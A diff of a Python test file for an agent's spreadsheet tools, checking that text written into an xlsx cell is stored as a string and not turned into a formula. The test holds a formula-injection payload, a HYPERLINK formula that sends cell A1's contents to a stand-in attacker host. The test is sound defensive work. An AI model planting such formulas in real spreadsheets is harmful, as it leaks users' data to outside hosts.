@@ -17,8 +17,8 @@ import pytest
 from openpyxl import Workbook, load_workbook
 
 from agent.extension.table_export import write_table
+from agent.tools.documents.blocks import set_xlsx_cell
 from agent.tools.documents.create import create
-from agent.tools.documents.edit import edit
 
 ROOT = Path(__file__).resolve().parents[1]
 EVIL = '=HYPERLINK("https://evil.example/?d="&A1,"click")'
@@ -42,13 +42,15 @@ def test_create_document_writes_text(tmp_path) -> None:
     assert {c.value: c.data_type for c in _cells(path)}["=1+1"] == "s"
 
 
-def test_edit_document_does_not_turn_text_into_a_formula(tmp_path) -> None:
+def test_set_cell_does_not_turn_text_into_a_formula(tmp_path) -> None:
     src = tmp_path / "in.xlsx"
     wb = Workbook()
-    wb.active["A1"] = "total: PLACEHOLDER"
-    wb.active["A2"] = "=1+1"                           # the user's own formula
+    ws = wb.active
+    assert ws is not None
+    ws["A1"] = "total: PLACEHOLDER"
+    ws["A2"] = "=1+1"                                  # the user's own formula
     wb.save(src)
-    edit(src, "total: PLACEHOLDER", EVIL)
+    set_xlsx_cell(src, src, "A1", EVIL)
     cells = {c.coordinate: c for c in _cells(src)}
     assert cells["A1"].value == EVIL and cells["A1"].data_type == "s"
     assert cells["A2"].data_type == "f"                # left as it was
